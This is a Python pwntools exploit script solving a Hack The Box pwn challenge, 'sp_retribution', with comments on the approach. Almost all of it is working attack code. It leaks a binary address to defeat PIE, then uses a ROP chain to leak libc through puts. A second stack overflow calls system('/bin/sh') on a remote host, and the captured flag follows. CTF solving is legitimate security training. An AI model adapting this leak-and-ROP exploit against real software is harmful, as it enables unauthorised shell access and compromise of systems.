# RazviOverfglow
# Python3

'''
checksec --file=sp_retribution 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   RW-RUNPATH   77) Symbols       No    0               2               sp_retribution
'''


'''
Explot idea: 
I got this idea by looking at the contents of the stack right before the print when confirming coordinates. Truns out
the "new coordinate" you provide (that gets printed) is writting right where there is an address from libc.__csu_init.

When selecting option number 2 (missile_launcher) and providing just one character 
to the new coordinate (for example, 0xa), when it gets printed it will print whatever the address 
cell contains as a string. Since the write is performed with `read`, there will be no 0x00 at the end. 
The memory cell where the byte is being written contains an address to libc.__csu_init, so 
being able to read its upper bytes allows us to recover its address, since the lower byte does not change.

Once libc.__csu_init address is leaked, we can get the base address of the library and perform a pop_rdi(/bin/sh); system().

Even though the binary is PIE and ASLR is enabled, the least significant 3 nibbles of the addresses aren't changed. That is,
I can take a look at libc.__csu_init in my binary (cd0), leak the address during the execution and replace the least 3 chars
(nibble + byte) with 0xcd0 This way I get to leak dynamic libc.__csu_init addres. From there on, I can get binary base address
(libc.__csu_init is a function within the binary, not the library). By getting its base addres, I can call
PLt.PUTS(GOT.PUTS) to get dynamic libc address. Once dynamic libc address is leaked, I can basically perform a
system(/bin/sh)
'''
from pwn import *

context.binary = binary = ELF("./sp_retribution", checksec=False)
library = ELF("./glibc/libc-2.23.so", checksec=False)
context.log_level = "debug"

#p = process(env = {"LD_LIBRARY_PATH" : "./glibc/libc-2.23.so"})
p = remote("134.209.178.167",31107)
#p.recvuntil(b"location") # Banner

payload = b"2"
p.sendline(payload)
p.recvuntil(b"y = ")
p.recvuntil(b"y = ")

payload = b""
p.sendline(payload)

# This output contains the address of libc.__csu_init in fomr of string and with its lowest byte overwritten with 0xa
output = p.recv() 
print(output)
output = output.split(b"y = ")[1]
output = output.split(b"[*]")[0]

# Converting the bytes to a hexsring. Discarding first and last 2 bytes, corresponding to a \n character
output = output.hex()[2:-2] 
print(output)

# Swapping endianness (by bytes) since we are passing from a string to an address (integer)
# From https://stackoverflow.com/a/5864313
output = "".join([output[i:i+2] for i in range(0, len(output), 2)][::-1])

# Discarding also de final nibble, since the address will contain the last 12 bits (nibble + byte) corresponding to the start of libc.__csu_init
output = output[:-1]  

output = output + "cd0"
print(output) 
libc_csu_init_address = int(output, 16)
print("[+] The address of libc.csu__init is {} {}".format(libc_csu_init_address, hex(libc_csu_init_address)))

#print(binary.symbols)

binary_base_address = libc_csu_init_address - binary.symbols.__libc_csu_init

print("[+] The base address of the binary is: {}".format(hex(binary_base_address)))

binary.address = binary_base_address
dynamic_main_address = binary.symbols.main

print("[+] Dynamin main address is: {}".format(hex(dynamic_main_address)))

'''
2nd read writes data at rbp-0x50 and writes up to 0x84 bytes
# We can leak several and address with puts so we get the dynamic base address of libc.
'''

dynamic_plt_puts = binary.plt.puts
dynamic_got_puts = binary.got.puts

# Create ROP object
rop = ROP(binary)

dynamic_pop_rdi = rop.rdi.address
#print(rop.ret)
#dynamic_ret_gadget = rop.ret.address

print("[+] Address of dynamic pop_rdi_ {}".format(hex(dynamic_pop_rdi)))

payload = b"A"*0x50 + b"B"*0x8 + p64(dynamic_pop_rdi) + p64(dynamic_got_puts) + p64(dynamic_plt_puts) + p64(dynamic_main_address)
p.sendline(payload)

'''
Locally a single call to p.recv() is enough.
Remotely 
'''
#p.interactive()
output = p.recv()

print(output)

output = output.split(b"\n")[2] # DYNAMIC PUTS ADDRESS

dynamic_puts_address = u64(output.strip().ljust(8, b"\x00"))
print("[+] PUTS dynamic address: {}".format(hex(dynamic_puts_address)))

dynamic_libc_address = dynamic_puts_address - library.symbols.puts

print("[+] LIBC dynamic address {}".format(hex(dynamic_libc_address)))

library.address = dynamic_libc_address

dynamic_system_address = library.symbols.system
dynamic_bin_sh = next(library.search(b'/bin/sh'))

##### NEW MAIN EXECUTION #######

payload = b"2"
p.sendline(payload)
p.recvuntil(b"y = ")
p.recvuntil(b"y = ")

payload = b""
p.sendline(payload)

payload = b"A"*0x50 + b"B"*0x8 + p64(dynamic_pop_rdi) + p64(dynamic_bin_sh) + p64(dynamic_system_address)
p.sendline(payload)


p.interactive()

# Flag HTB{d0_n0t_3v3R_pr355_th3_butt0n}




